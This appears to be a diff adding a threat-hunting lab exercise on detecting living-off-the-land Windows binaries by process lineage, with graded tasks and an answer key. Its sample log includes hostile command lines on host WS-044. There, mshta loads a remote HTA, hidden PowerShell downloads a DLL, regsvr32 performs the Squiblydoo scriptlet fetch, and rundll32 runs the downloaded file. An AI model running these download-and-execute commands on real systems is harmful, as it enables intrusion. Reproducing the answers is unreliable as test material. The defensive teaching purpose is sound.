@@ -1,0 +1,86 @@
+slug: lab-hunt-lolbin-lineage
+lesson: hunt-lolbins-process-lineage
+title: Hunt living-off-the-land binaries by process lineage
+pass_mark: 80
+scenario: |
+  Hypothesis: an attacker is using signed Windows binaries (mshta, regsvr32, rundll32,
+  certutil) to download and run code, hoping that "it's a Microsoft file" keeps them hidden.
+  You have a morning of process-creation events from three workstations (pipe-separated).
+
+  Every one of these binaries also has legitimate uses on this estate, so judge each by its
+  **lineage** (what started it and what it started) and its **arguments** (remote URLs, temp
+  folders, hidden windows), not by its name.
+artifacts:
+- name: process_events.txt
+  kind: csv
+  description: Process creation events, 2 October (UTC).
+  content: |
+    time|host|parent|process|command_line
+    09:01:12|WS-044|explorer.exe|chrome.exe|chrome.exe
+    09:05:40|WS-044|explorer.exe|outlook.exe|OUTLOOK.EXE
+    09:30:02|WS-051|services.exe|svchost.exe|svchost.exe -k netsvcs
+    10:12:19|WS-044|outlook.exe|mshta.exe|mshta.exe https://cdn-docs.example/view.hta
+    10:12:25|WS-044|mshta.exe|powershell.exe|powershell.exe -nop -w hidden -c "iwr https://cdn-docs.example/a -o $env:TEMP\a.dll"
+    10:12:41|WS-044|powershell.exe|regsvr32.exe|regsvr32.exe /s /u /i:https://cdn-docs.example/s.sct scrobj.dll
+    10:13:02|WS-044|regsvr32.exe|rundll32.exe|rundll32.exe C:\Users\n.adeyemi\AppData\Local\Temp\a.dll,DllRegisterServer
+    10:40:55|WS-062|explorer.exe|regsvr32.exe|regsvr32.exe C:\Program Files\Contoso CAD\cadshell.dll
+    11:02:13|WS-051|cmd.exe|certutil.exe|certutil.exe -verify C:\certs\vpn.cer
+    11:15:30|WS-062|explorer.exe|mshta.exe|mshta.exe C:\Program Files\Contoso HR\launcher.hta
+tasks:
+- prompt: Which host shows the malicious chain?
+  type: text
+  accepted:
+  - WS-044
+  hint: Follow parent to child from an email client.
+  explanation: 'WS-044: Outlook started mshta with a remote HTA, which started hidden PowerShell, then regsvr32,
+    then rundll32 loading a DLL from Temp. Each step is a LOLBin handing off to the next.'
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: ^[^|]+\|([^|]+)\|outlook\.exe\|mshta\.exe\|
+- prompt: Which process started the first LOLBin in the chain?
+  type: text
+  accepted:
+  - outlook.exe
+  - outlook
+  hint: Find the parent of the mshta that loaded a remote URL.
+  explanation: 'outlook.exe: the user clicked a link or attachment. An email client spawning mshta is high-fidelity
+    on its own and a good detection.'
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: ^[^|]+\|[^|]+\|([^|]+)\|mshta\.exe\|mshta\.exe https
+- prompt: Which domain hosted the attacker's payloads?
+  type: text
+  accepted:
+  - cdn-docs.example
+  hint: All the remote URLs in the chain share one host.
+  explanation: cdn-docs.example served the HTA, the DLL and the scriptlet. Block it and search proxy logs for other
+    hosts that reached it.
+  verify:
+    artifact: process_events.txt
+    op: set
+    pattern: https://([^/]+)/
+- prompt: How many process launches belong to the malicious chain (from mshta to rundll32)?
+  type: number
+  accepted:
+  - '4'
+  hint: Count the WS-044 events from 10:12 to 10:13.
+  explanation: 'Four: mshta, powershell, regsvr32 and rundll32. The regsvr32 /i:URL scrobj.dll form is the ''Squiblydoo''
+    technique.'
+  verify:
+    artifact: process_events.txt
+    op: count
+    pattern: ^10:1[23]:\d\d\|WS-044\|
+- prompt: WS-062 also ran regsvr32 and mshta. What is your verdict?
+  type: choice
+  options:
+  - 'Malicious: any use of regsvr32 or mshta is an attack'
+  - 'Benign: both were started from Explorer against local files in Program Files belonging to installed company
+    software, with no remote URLs'
+  - Malicious, because it happened on the same morning
+  - Cannot judge without memory forensics
+  answer: 1
+  hint: Apply the same lineage and argument checks you used on WS-044.
+  explanation: The user launched them from Explorer against installed vendor files, with no downloads or temp paths.
+    Recording these as known-good lets you exclude them narrowly while keeping the detection sharp.
